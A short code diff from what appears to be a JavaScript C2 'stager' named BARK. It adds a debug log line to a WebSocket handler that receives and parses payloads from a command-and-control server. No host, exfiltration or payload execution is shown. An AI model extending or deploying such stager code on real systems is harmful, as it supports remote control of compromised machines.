@@ -60,6 +60,7 @@
             // Listen for messages from server
             socket.addEventListener('message', (event) => {
                 console.log("[BARK Stager] Received payload from C2 server");
+                console.log("[BARK Stager] Message data:", event.data);
                 try {
                     // Parse the response
                     const response = JSON.parse(event.data);
